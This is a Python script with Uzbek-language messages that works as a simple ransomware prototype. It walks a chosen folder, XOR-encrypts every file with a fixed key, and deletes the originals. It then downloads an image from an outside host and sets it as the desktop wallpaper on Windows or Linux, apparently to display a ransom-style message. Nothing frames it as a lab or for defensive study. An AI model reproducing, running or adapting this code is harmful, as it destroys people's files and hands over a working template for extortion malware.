import os
import sys
import urllib.request
import ctypes

def encrypt_file(file_path):
    key = 13
    try:
        with open(file_path, 'rb') as file:
            content = file.read()

        encrypted_content = bytearray()
        for byte in content:
            encrypted_content.append(byte ^ key)

        encrypted_file_path = file_path + '.encrypted'
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_content)

        print(f"{file_path} shifrlanib {encrypted_file_path} ga saqlandi.")
        os.remove(file_path)
        print(f"Asl fayl {file_path} o'chirildi.")
    except Exception as e:
        print(f"Faylni shifrlashda xato yuz berdi: {e}")

def encrypt_all_files_in_folder(folder_path):
    if os.path.isdir(folder_path):  # Bu yerda os.path.exists o'rniga os.path.isdir qo'llanildi
        for root, dirs, files in os.walk(folder_path):
            for filename in files:
                file_path = os.path.join(root, filename)
                encrypt_file(file_path)
    else:
        print("Papka topilmadi. Papka yo'li: ", folder_path)

def download_image(image_url, save_path):
    try:
        urllib.request.urlretrieve(image_url, save_path)
        print("Rasm muvaffaqiyatli yuklandi.")
        return True
    except Exception as e:
        print(f"Rasmni yuklashda xato yuz berdi: {e}")
        return False

def set_wallpaper(image_path):
    if sys.platform.startswith('win'):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
            print("Windowsda fon rasm o'zgartirildi.")
        except Exception as e:
            print(f"Fon rasmni o'zgartirishda xato yuz berdi: {e}")
    elif sys.platform.startswith('linux'):
        try:
            os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{image_path}")
            print("Linuxda fon rasm o'zgartirildi.")
        except Exception as e:
            print(f"Fon rasmni o'zgartirishda xato yuz berdi: {e}")
    else:
        print("Bu operatsion tizimni qo'llab-quvvatlamaymiz.")

def main():
    target_folder = 'C:/Users/user/Desktop/papka'  # o'z papka manzilingizni kiriting
    print("Papka yo'li tekshirilmoqda:", target_folder)
    
    encrypt_all_files_in_folder(target_folder)

    image_url = 'https://i.imghippo.com/files/ZMx2558bk.png'
    image_path = os.path.join(os.path.expanduser("~"), "Desktop", "salom.png")

    if download_image(image_url, image_path):
        set_wallpaper(image_path)

if __name__ == "__main__":
    main()
